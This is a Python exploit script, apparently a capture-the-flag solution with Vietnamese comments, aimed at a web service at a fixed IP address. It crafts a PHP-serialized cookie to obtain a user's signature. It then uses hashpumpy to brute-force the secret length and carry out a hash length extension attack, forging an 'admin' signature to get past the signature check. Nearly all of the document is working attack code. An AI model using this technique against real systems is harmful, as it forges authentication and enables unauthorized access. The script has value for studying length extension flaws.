import requests
import hashpumpy
import base64



url='http://68.183.78.94:4333/'

def getSig(): # lấy signature của 1 user bất kì, ở đây là của giangvq
    user = b'O:4:"User":1:{s:7:"welcome";O:9:"Signature":1:{s:4:"name";s:7:"giangvq";}}'
    user = base64.b64encode(user).decode('ascii')
    header = {"Cookie":"user={}".format(user)}
    res = requests.get(url,headers=header)

    result = res.text.split("signature: ")[1].split(" ")[0]
    return result


old_sig = getSig() # old_sig
mes_old = "giangvq"

secret_len = 0


# brute len của secret key, tìm hiểu hash_len_attack.
for i in range(100):     
    print("[*] Test Length = " + str(i))
    new_sig,mes = hashpumpy.hashpump(old_sig,mes_old,"admin",i)
    mes = str(mes)[1:].replace("'","").replace("\\x","%")
    print("    New hash: "+new_sig)
    print("    New message: "+mes)
    data=f"user={mes}&sig={new_sig}"
    r = requests.get(url+"view.php?"+data,headers={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"})
    if "Good signature" in r.text:
        print("[*] Found len of secret key: " + str(i))
        secret_len = i
        break
    

new_sig,mes = hashpumpy.hashpump(old_sig,mes_old,"admin",secret_len) 
mes = str(mes)[1:].replace("'","").replace("\\x","%")
mes = mes.replace("admin","")


# Đọc kỹ lại cơ chế cộng chuỗi và tạo sig
data=f"a={mes}&sig={new_sig}&user=admin"
r = requests.get(url+"view.php?"+data,headers={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"})
print(r.text)
